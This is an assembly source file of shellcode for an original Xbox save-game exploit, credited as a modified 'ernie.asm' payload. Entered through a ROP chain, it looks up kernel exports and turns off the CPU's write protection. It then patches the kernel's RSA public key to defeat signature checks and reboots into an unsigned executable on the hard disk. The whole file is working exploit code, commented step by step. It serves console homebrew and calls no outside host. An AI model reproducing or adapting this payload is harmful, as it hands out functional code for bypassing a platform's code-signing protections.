;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;; 
; Modified ernie.asm shellcode for robohaxx
; Originally modified from: https://github.com/agarmash/FroggerBeyondExploit/blob/master/source/savefile.asm
; which was modified from https://github.com/Rocky5/Xbox-Softmodding-Tool/blob/master/App%20Sources/NKPatcher/Main%20NKP11/ernie.asm
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

        BITS 32
base:
        mov     ebp, eax ; Set the EBP to point to the beginning of the exploit (ROP chain makes eax the start address!)
        cld ; Clear the Direction Flag so the string instructions increment the address
        mov	esi,80010000h ; Kernel base address
        mov	eax,[esi+3Ch] ; Value of e_lfanew (File address of new exe header)
        mov	ebx,[esi+eax+78h] ; Value of IMAGE_NT_HEADERS32 -> IMAGE_OPTIONAL_HEADER32 -> IMAGE_DATA_DIRECTORY -> ibo32 (Virtual Address) (0x02e0)
        add	ebx,esi
        mov	edx,[ebx+1Ch] ; Value of IMAGE_DIRECTORY_ENTRY_EXPORT -> AddressOfFunctions (0x0308)
        add	edx,esi ; Address of kernel export table
        lea	edi,[ebp+kexports-base] ; Address of the local kernel export table
getexports:	
        mov	ecx,[edi] ; Load the entry from the local table
        jecxz	.done
        sub	ecx,[ebx+10h] ; Subtract the IMAGE_DIRECTORY_ENTRY_EXPORT -> Base
        mov	eax,[edx+4*ecx] ; Load the export by number from the kernel table
        test	eax,eax
        jz	.empty ; Skip if the export is empty
        add	eax,esi ; Add kernel base address to the export to construct a valid pointer
.empty:
        stosd ; Save the value back to the local table and increment EDI by 4
        jmp	getexports
.done:
blinkled: ; https://xboxdevwiki.net/PIC#The_LED
        mov	edi,[ebp+HalWriteSMBusValue-base]
        push	0D7h ; Red-orange-green-orange LED sequence
        push	byte 0
        push	byte 8
        push	byte 20h
        call	edi
        push	byte 1
        push	byte 0
        push	byte 7
        push	byte 20h
        call	edi
patchpublickey:	
        mov	ebx,[ebp+XePublicKeyData-base] ; The structure and location of the RSA key hasn't been changed between the kernel versions, no need to search for anything
        pushf ; Enter the critical section, more details here: 
        cli   ; https://lkml.iu.edu/hypermail/linux/kernel/9703.0/0060.html
        mov	eax,cr0
        mov	ecx, eax
        and	ecx,0FFFEFFFFh ; Clear the Write Protect bit
        mov	cr0,ecx
        mov     ecx, cr3 ; Invalidate TLB to defeat possible implicit caching. Done to make sure that no unpatched code is executed speculatively.
        mov     cr3, ecx ; See Intel Software Dev Manual Vol. 3A, 11.7 Implicit Caching
        xor	dword [ebx+110h],2DD78BD6h ; Alter the last 4 bytes of the public key
        mov	cr0, eax ; Restore the original value
        wbinvd ; Flush the CPU caches
        mov     ecx, cr3 ; Invalidate TLB once again, just in case
        mov     cr3, ecx
        popf ; Leave the critical section
launchxbe: ; Quite similar to https://github.com/XboxDev/OpenXDK/blob/master/src/hal/xbox.c#L36
        mov	esi,[ebp+LaunchDataPage-base] ; https://xboxdevwiki.net/Kernel/LaunchDataPage
        mov	ebx,[esi]
        mov     edi,1000h
        test	ebx,ebx ; Check the LaunchDataPage pointer
        jnz	.memok ; Jump if it's not NULL
        push	edi
        call	dword [ebp+MmAllocateContiguousMemory-base] ; Otherwise, allocate a memory page
        mov	ebx,eax ; And store the pointer to the allocated page in EBX
        mov     [esi],eax ; Store the pointer back to the kernel as well
.memok:	
        push	byte 1
        push	edi
        push	ebx
        call	dword [ebp+MmPersistContiguousMemory-base]

        mov	edi,ebx
        xor	eax,eax
        mov	ecx,400h
        rep	stosd ; Fill the whole LaunchDataPage memory page (4096 Bytes) with zeros

        or	dword [ebx],byte -1 ; Set LaunchDataPage.launch_data_type to 0xFFFFFFFF
        mov	[ebx+4],eax ; Set LaunchDataPage.title_id to 0
        lea	edi,[ebx+8] ; Copy the address of LaunchDataPage.launch_path string
        lea	esi,[ebp+xbestr-base]
        push	byte xbestrlen
        pop	ecx
        rep	movsb ; Copy the executable path to the LaunchDataPage.launch_path
        push	byte 2 ; 2 stands for ReturnFirmwareQuickReboot
        call	dword [ebp+HalReturnToFirmware-base]
.inf:
        jmp	short .inf

kexports:	
HalReturnToFirmware		dd 49
HalWriteSMBusValue		dd 50
LaunchDataPage			dd 164
MmAllocateContiguousMemory	dd 165
MmPersistContiguousMemory	dd 178
XePublicKeyData			dd 355
                                dd 0
xbestr:						
                                db '\Device\Harddisk0\Partition1\UDATA\544d0002\8DEDAC5BF7EA;default.xbe',0
xbestrlen	                equ $-xbestr
